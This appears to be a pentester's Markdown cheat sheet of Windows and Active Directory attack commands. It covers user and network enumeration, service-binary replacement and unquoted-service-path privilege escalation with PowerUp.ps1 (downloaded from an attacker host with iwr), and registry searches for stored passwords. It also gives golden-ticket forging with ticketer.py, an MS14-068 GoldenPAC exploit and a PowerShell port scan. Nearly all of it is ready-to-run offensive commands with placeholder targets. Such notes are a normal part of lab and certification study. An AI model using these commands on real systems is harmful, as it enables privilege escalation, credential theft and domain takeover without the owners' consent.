System browsing:
---
```cmd
net user
```

```powershell
Get-LocalUser
```

```powershell
GCI -hidden -recurse
ls -force
```

```cmd
net user $USER
```

```cmd
netstat -an
netstat -an | findstr $PORT
```

Replace service
---
Get list of running services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check file permissions:

```powershell
icacls 'c:\...'
```
(F) - full permissions, read, write, execute

or automate the process with PowerUp.ps1
#powerup #replace-service #privesc 
```powershell
iwr -uri http://$LOCAL_IP/PowerUp.ps1 -Outfile PowerUp.ps1
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '$SERVICE'
Restart-Service $SERVICE
```
Search for passwords inside the registry
---
```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Find misconfigured services (default settings)
---
```powershell
cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" |findstr /i /v "\`""
```

#unquoted #service-privesc

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v "\`"" | findstr ":"
```

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '$SERVICE_NAME' -Path "C:\$UNQUOTED_PATH"
Restart-Service $SERVICE
```
Golden ticket:
---
generate user password hash:

```python
import hashlib
hashlib.new('md4', '$PASSWORD'.encode('utf-16le')).digest().hex()
# save hash for later
```

or use

```url
https://gchq.github.io/CyberChef/#recipe=NT_Hash()
```

```powershell
get-addomain
#extract DomainSID
```

```shell
ticketer.py -nthash $HASH -domainsid $DOMAINSID -domain $DOMAIN -spn AnyName/$DCDOMAIN administrator
```

```shell
KRB5CCNAME=administrator.ccache mssqlclient.py -k administrator@$DCDOMAIN
```

GoldenPAC ms14-068

```bash
impacket-goldenPac -dc-ip $TARGET_IP -target-ip $TARGET_IP '$DOMAIN/$USER:$PASSWORD@$MACHINE.$DOMAIN'
```

Port scanning using PowerShell
---

Scan if single port is open:
```powershell
Test-NetConnection 127.0.0.1 -Port $port
```

scan ports from 1 to 1024(slow):
```powershell
foreach ($port in 1..1024){If(($a=Test-NetConnection 127.0.0.1 -Port $port -WarningAction SilentlyContinue).TcpTestSucceeded -eq $true){"TCP port $port is open"}}
```